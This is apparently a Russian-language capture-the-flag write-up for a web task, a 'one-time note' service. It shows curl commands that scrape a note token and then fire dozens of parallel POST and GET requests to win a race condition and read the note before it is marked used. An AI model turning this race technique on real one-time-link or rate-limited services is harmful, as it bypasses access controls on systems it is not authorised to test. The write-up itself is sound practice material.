# Writeup

**Category:** Web  
**Service:** http://tasks.4x10m.ru  
**Port:** 20992  

Формат флага: `axiom{...}`

---

# Описание

По условию дан сервис одноразовых записок.  
Лосяш утверждает, что каждая ссылка открывается **ровно один раз**, после чего становится недоступной.

На главной странице сервиса отображается ссылка на записку, внутри которой находится флаг.

---

# Получение ссылки

Сначала получаем одноразовую ссылку с главной страницы.

```bash
curl -s http://tasks.4x10m.ru:20992/ | grep -Eo '/s/[a-f0-9]{32}'
```

Пример результата:

```
/s/7b0d7d1a77424fc3a11e0f2c3129f64e
```

---

# Анализ

При проверке запросов выяснилось, что сервис использует два endpoint:

```
POST /s/<token>/open
GET  /s/<token>/paper
```

Логика сервиса:

1. `/open` помечает записку как открытую  
2. `/paper` возвращает содержимое записки  

Однако между этими действиями возникает **race condition**.

Если отправить большое количество параллельных запросов, можно получить содержимое записки до того, как она будет помечена как использованная.

---

# Эксплуатация

Сначала получаем токен:

```bash
base='http://tasks.4x10m.ru:20992'

tok=$(curl -s "$base/" | grep -Eo '/s/[a-f0-9]{32}' | head -n1 | cut -d/ -f3)
```

Далее запускаем race condition:

```bash
(
for i in $(seq 1 40); do
  curl -s -X POST $base/s/$tok/open &
done

for i in $(seq 1 300); do
  curl -s $base/s/$tok/paper &
done

wait
)
```

Один из ответов `/paper` вернет содержимое записки.

# Итог

Причина уязвимости — **race condition** между проверкой состояния записки и её выдачей.  
При большом количестве параллельных запросов можно получить содержимое одноразовой записки до того, как она будет окончательно помечена как использованная.
